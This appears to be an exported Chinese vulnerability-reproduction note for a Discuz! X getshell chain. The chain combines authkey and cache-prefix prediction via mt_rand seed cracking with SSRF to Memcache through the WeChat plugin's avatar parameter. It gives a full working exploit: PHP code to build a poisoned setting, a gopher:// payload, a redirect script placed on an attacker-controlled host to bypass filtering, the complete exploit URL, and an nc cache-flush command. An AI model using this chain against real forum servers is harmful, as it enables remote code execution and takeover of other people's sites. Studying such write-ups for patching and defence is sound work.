<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x-authkeymemcachessrf-getshell"><span class="csDE05BCC">Discuz! X authkey+Memcache+ssrf getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要得到</span><span class="cs8926E06">authkey</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Dz </span><span class="cs9C1B1871">整合</span><span class="cs8926E06"> Memcache </span><span class="cs9C1B1871">配置成功后，默认情况下网站首页右下角会出现</span><span class="cs9FB05234">MemCache On</span><span class="cs9C1B1871">的标志：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20authkey+Memcache+ssrf%20getshell_files/image0.jpg" width="560" height="67" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Dz </span><span class="cs9C1B1871">在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果</span><span class="cs8926E06"> SSRF </span><span class="cs9C1B1871">要攻击</span><span class="cs8926E06"> Memcache </span><span class="cs9C1B1871">，第一个问题是，如何找到正确的键名？</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">install/index.php</span><span class="cs8926E06"> 345-357</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这是</span><span class="cs8926E06"> Dz </span><span class="cs9C1B1871">在安装的时候的一段代码，这段代码设置了</span><span class="cs8926E06"> authkey</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Cookie </span><span class="cs9C1B1871">前缀以及缓存键名前缀，其中用到了</span><span class="cs9FB05234">random</span><span class="cs9C1B1871">函数生成随机字符串。所以跟进这个</span><span class="cs9FB05234">random</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">function random($length) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$hash = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$max = strlen($chars) - 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PHP_VERSION &lt; &#39;4.2.0&#39; &amp;&amp; mt_srand((double)microtime() * 1000000);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0; $i &lt; $length; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hash .= $chars[mt_rand(0, $max)];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $hash;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以发现，如果</span><span class="cs8926E06"> PHP </span><span class="cs9C1B1871">版本大于</span><span class="cs8926E06"> 4.2.0</span><span class="cs9C1B1871">，那么</span><span class="cs8926E06"> </span><span class="cs9FB05234">mt_rand</span><span class="cs8926E06"> </span><span class="cs9C1B1871">随机数的种子是不变的。也就是说，生成</span><span class="cs8926E06"> authkey</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Cookie </span><span class="cs9C1B1871">前缀以及缓存键名前缀时调用的</span><span class="cs8926E06"> </span><span class="cs9FB05234">mt_rand</span><span class="cs8926E06"> </span><span class="cs9C1B1871">用的都是同一个种子，而</span><span class="cs8926E06"> Cookie </span><span class="cs9C1B1871">前缀是已知的，通过观察</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用</span><span class="cs8926E06"> <a class="cs508254C" href="https://link.zhihu.com/?target=http%3A//www.openwall.com/php_mt_seed/README"><span class="cs4B51D5E4">php_mt_seed</span></a></span><span class="cs8926E06"> </span><span class="cs9C1B1871">进行种子爆破。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06"> </span><span class="cs9FB05234">mt_rand</span><span class="cs8926E06"> </span><span class="cs9C1B1871">种子的猜解，缓存键名前缀的可能性从</span><span class="cs8926E06"> 62^6 </span><span class="cs9C1B1871">缩小到不到</span><span class="cs8926E06"> 1000 </span><span class="cs9C1B1871">个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造</span><span class="cs8926E06"> SSRF </span><span class="cs9C1B1871">请求发送到服务器，最后即能更改某一键名对应的键值。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Memcache </span><span class="cs9C1B1871">缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来</span><span class="cs8926E06"> getshell</span><span class="cs9C1B1871">？</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这一部分的思路就可以直接参照</span><span class="cs8926E06"> chengable </span><span class="cs9C1B1871">写的那篇文章了，</span><span class="cs9FB05234">output_replace</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后准备用</span><span class="cs8926E06"> gopher </span><span class="cs9C1B1871">协议构造</span><span class="cs8926E06"> SSRF </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> payload</span><span class="cs9C1B1871">。写这样一段代码（先假设缓存键名前缀是</span><span class="cs8926E06"> </span><span class="cs9FB05234">IwRW7l</span><span class="cs9C1B1871">）</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;search&#39;][&#39;plugins&#39;] = &#39;/.*/&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;replace&#39;][&#39;plugins&#39;] = &#39;phpinfo()&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$_G[&#39;setting&#39;][&#39;rewritestatus&#39;] = 1;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$memcache = new Memcache;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$memcache-&gt;connect(&#39;localhost&#39;, 11211) or die (&quot;Could not connect&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$memcache-&gt;set(&#39;IwRW7l_setting&#39;, $_G[&#39;setting&#39;]);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行这段</span><span class="cs8926E06"> PHP </span><span class="cs9C1B1871">代码，同时抓包，然后将数据包改成</span><span class="cs8926E06"> gopher </span><span class="cs9C1B1871">的形式，即：</span></p><p class="cs3A447A38"><span class="cs9FB05234">gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是直接用它去</span><span class="cs8926E06"> SSRF </span><span class="cs9C1B1871">是不可以的，会被</span><span class="cs9FB05234">_xss_check</span><span class="cs9C1B1871">检测到特殊字符而被拒绝请求：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$url = base64_decode($_REQUEST[&#39;url&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">header( &quot;Location: &quot; . $url );</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样就可以将</span><span class="cs8926E06"> SSRF URL </span><span class="cs9C1B1871">进行</span><span class="cs8926E06"> base64 </span><span class="cs9C1B1871">编码从而规避</span><span class="cs9FB05234">_xss_check</span><span class="cs9C1B1871">的检测。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;wxopenid=xxxyyy</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再访问</span><span class="cs9FB05234">/forum.php?mod=ajax&amp;action=getthreadtypes&amp;inajax=yes</span><span class="cs9C1B1871">，即可看到</span><span class="cs9FB05234">phpinfo()</span><span class="cs9C1B1871">代码已被执行：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20authkey+Memcache+ssrf%20getshell_files/image0.png" width="560" height="265" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次</span><span class="cs8926E06"> getshell </span><span class="cs9C1B1871">后执行以下命令，网站就可以恢复正常：</span></p><p class="cs3A447A38"><span class="cs9FB05234">echo -e &#39;flush_all&#39; | nc localhost 11211</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://zhuanlan.zhihu.com/p/51907363</span></p></body>
</html>
